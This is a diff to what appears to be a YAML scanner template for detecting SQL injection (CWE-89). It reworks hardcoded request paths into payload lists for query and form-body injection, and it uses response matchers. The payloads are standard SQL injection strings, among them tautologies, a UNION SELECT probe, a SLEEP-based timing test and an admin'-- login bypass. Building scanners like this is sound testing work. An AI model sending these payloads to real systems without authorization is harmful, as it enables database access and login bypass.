@@ -8,7 +8,13 @@ info:
     cwe: "CWE-89"
 requests:
   - method: GET
-    path: "/product?id=1' OR '1'='1"
+    path: "/"
+    attack: inject
+    inject_in: query
+    payloads:
+      - "' OR '1'='1"
+      - "1 UNION SELECT NULL--"
+      - "SLEEP(5)"
     matchers:
       - type: regex
         part: body
@@ -27,10 +33,16 @@ requests:
           - 500
     matcher_condition: or
 
-  - method: GET
-    path: "/product?id=1 UNION SELECT NULL--"
+  - method: POST
+    path: "/"
+    attack: inject
+    inject_in: body
+    payloads:
+      - "' OR 1=1--"
+      - "admin'--"
+    body: "INJECT_HERE"
     headers:
-      Accept: "text/html"
+      Content-Type: "application/x-www-form-urlencoded"
     matchers:
       - type: word
         part: body
@@ -42,26 +54,6 @@ requests:
       - type: status
         part: status
         status:
-          - 200
-    matcher_condition: or
-
-  - method: POST
-    path: "/login"
-    body: "username=admin'--&password=test"
-    headers:
-      Content-Type: "application/x-www-form-urlencoded"
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "Welcome"
-          - "Dashboard"
-          - "admin"
-          - "logout"
-      - type: status
-        part: status
-        status:
-          - 302
-          - 200
+          - 500
     matcher_condition: or
     follow_redirects: true
